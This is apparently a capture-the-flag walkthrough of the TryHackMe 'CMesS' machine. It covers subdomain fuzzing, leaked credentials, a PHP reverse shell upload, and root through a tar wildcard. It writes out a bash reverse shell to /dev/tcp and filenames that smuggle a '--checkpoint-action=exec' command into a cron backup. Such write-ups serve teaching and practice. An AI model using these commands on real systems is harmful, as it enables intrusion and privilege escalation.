
Let's start with a nmap scan. 
```
# Nmap 7.91 scan initiated Fri Jun 11 17:04:10 2021 as: nmap -sC -sV -A -oN scans/nmap-output 10.10.250.5
Nmap scan report for 10.10.250.5
Host is up (0.16s latency).
Not shown: 997 closed ports
PORT     STATE    SERVICE       VERSION
22/tcp   open     ssh           OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d9:b6:52:d3:93:9a:38:50:b4:23:3b:fd:21:0c:05:1f (RSA)
|   256 21:c3:6e:31:8b:85:22:8a:6d:72:86:8f:ae:64:66:2b (ECDSA)
|_  256 5b:b9:75:78:05:d7:ec:43:30:96:17:ff:c6:a8:6c:ed (ED25519)
80/tcp   open     http          Apache httpd 2.4.18 ((Ubuntu))
|_http-generator: Gila CMS
| http-robots.txt: 3 disallowed entries 
|_/src/ /themes/ /lib/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
1247/tcp filtered visionpyramid
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jun 11 17:04:59 2021 -- 1 IP address (1 host up) scanned in 49.19 seconds
```
Looks like we got a web page called **gilla CMS** and we got a port 22 ssh open. 

---web page---

Let's run a dirb scan just in case. Dirb give me a ton of directories. Among them I found this login page. (cmess.thm/admin/)

---admin---

If we look at the hints. It told us to ``Have you tried fuzzing for subdomains?`` fuzz let's do this with wfuzz.

Here is the command I used for wfuzz :

```bash
wfuzz -c -w /opt/seclist/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://cmess.thm' -H "Host: FUZZ.cmess.thm" --hw 290 
```
First I didn't specify wordcount. It gives me lot of 290. Then I specify wordcount using **--hw 290**.Let's see that in action.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://cmess.thm/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                      
=====================================================================

000000019:   200        30 L     104 W      934 Ch      "dev"                        

Total time: 88.31007
Processed Requests: 4989
Filtered Requests: 4988
Requests/sec.: 56.49411
```
we get a subdomain dev.cmess.thm. We add it to our /etc/hosts file to the same IP address as of cmess.thm. we can see the page like this.

---dev----

It seems to be a chat between user andre and the support. And we get the email and password for the user andre which can be used for login in the cms. 

Our credentials

* Email: andre@cmess.thm
* Password: KPFTN_f2yxe%

---about---

After the login you can see the **Gila CMS** version number. But I didn't go ahead and search for exploit. Looking around, we see that we have the ability to upload files to the machine at **Content -> File Manager** option. 

---upload---

We can upload the **php-rev-shell** now. Let's setup a netcat listner and upload the file.

After we upload it. You can find it in assests. 

---shell---

After we execute it. We got the call back.

```bash
┌─[visith@parrot]─[~/CTF/thm/CMeSS]
└──╼ $nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.9.2.182] from (UNKNOWN) [10.10.250.5] 32872
Linux cmess 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 05:16:04 up 42 min,  0 users,  load average: 0.00, 0.00, 0.03
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ /usr/bin/script -qc /bin/bash /dev/null
www-data@cmess:/$ ls
ls
bin   dev  home        lib    lost+found  mnt  proc  run   srv	tmp  var
boot  etc  initrd.img  lib64  media	  opt  root  sbin  sys	usr  vmlinuz
```
After some enumerations. MySQL database password in **/var/www/html**. It's file called config.php. But this is long way to get andre's password. 

When we go into the **/opt/** directory. You can see hidden file called
**.password.bak**. It gives andre's password.

```bash
www-data@cmess:/$ cd opt
cd opt
www-data@cmess:/opt$ ls -la
ls -la
total 12
drwxr-xr-x  2 root root 4096 Feb  6  2020 .
drwxr-xr-x 22 root root 4096 Feb  6  2020 ..
-rwxrwxrwx  1 root root   36 Feb  6  2020 .password.bak
www-data@cmess:/opt$ cat .password.bak
cat .password.bak
andres backup password
UQfsdCB7aAP6
```
Our ssh login credentials 
* User: andre
* password: UQfsdCB7aAP6

```bash
┌─[✗]─[visith@parrot]─[~/CTF/thm/CMeSS]
└──╼ $ssh andre@10.10.250.5
andre@10.10.250.5's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Thu Feb 13 15:02:43 2020 from 10.0.0.20
andre@cmess:~$ ls
backup  user.txt
andre@cmess:~$ cat user.txt
thm{c529b5d5d6ab6**************}
```
We got our first flag. Let's try to run sudo.

```bash
andre@cmess:~$ sudo -l
[sudo] password for andre: 
Sorry, user andre may not run sudo on cmess.
```
We can't run sudo with this user. Let's run a linpeas and see what we got.

---linpeas----

Linpeas shows us some interesting cron jobs.linpeas marks it as 99% PE vector. We see that the cron job backups everyting under the folder **/home/andre/backup** to the /tmp folder as a **tar**. For tar ing the files, it uses wildcard. Googling for a bit, we find that this wildcard can be exploited.

This exploit has been very well explained in this blog :
https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/

```bash
andre@cmess:~$ cd backup/
andre@cmess:~/backup$ ls
note
andre@cmess:~/backup$ cat note 
Note to self.
Anything in here will be backed up! 
```
As we found in linpeas output. They put a note to us. Let's try to exploit. 

we need write a script shell.sh that gives us a reverse shell. This was my rev shell. 

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.9.2.182/4242 0>&1
```
Let's execute our exploit like this.
```bash
andre@cmess:~/backup$ nano shell.sh
andre@cmess:~/backup$ echo "" > "--checkpoint-action=exec=bash shell.sh"
andre@cmess:~/backup$ echo "" > --checkpoint=1
andre@cmess:~/backup$ echo "" > --checkpoint=1
```
And after a bit of time, we get our root shell and can read the root.txt under /root.

```bash
┌─[visith@parrot]─[~/CTF/thm/CMeSS/www]
└──╼ $nc -lnvp 4242
listening on [any] 4242 ...
connect to [10.9.2.182] from (UNKNOWN) [10.10.250.5] 60638
bash: cannot set terminal process group (21478): Inappropriate ioctl for device
bash: no job control in this shell
root@cmess:/home/andre/backup# cd /root
cd /root
root@cmess:~# ls
ls
root.txt
root@cmess:~# cat root.txt
cat root.txt
thm{9f85b7fdeb2cf9698**************}
root@cmess:~#
```

Thx for reading !!
Have a nice day










